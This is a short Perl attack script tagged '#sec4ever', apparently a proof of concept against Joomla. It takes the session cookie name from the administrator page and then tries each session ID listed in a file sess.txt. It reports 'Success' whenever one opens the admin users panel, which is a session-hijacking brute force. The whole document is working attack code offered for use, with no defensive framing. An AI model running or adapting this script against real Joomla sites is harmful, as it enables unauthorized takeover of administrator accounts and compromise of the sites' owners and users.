#!perl
#sec4ever
use LWP::UserAgent;
my $ua = LWP::UserAgent->new(agent => 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',show_progress => 0);
my $req = $ua->get("http://127.0.0.1/scripts/joomla/administrator/index.php?option=com_users&view=users");
my ($token) = $req->header('Set-Cookie') =~ /([a-zA-Z0-9]{32})=/;
print "token: $token\n";
open IN,'sess.txt' or die $!;
while(my $sess = <IN>)
{
    chomp $sess;
    my $req = $ua->get("http://127.0.0.1/scripts/joomla/administrator/index.php?option=com_users&view=users",Cookie => "$token=$sess");
    if($req->content =~ /adminForm/)
    {
        print "[Sess] $sess Success\n";
    }else{
        print "[Sess] $sess Faild\n";
    }
}
close IN;
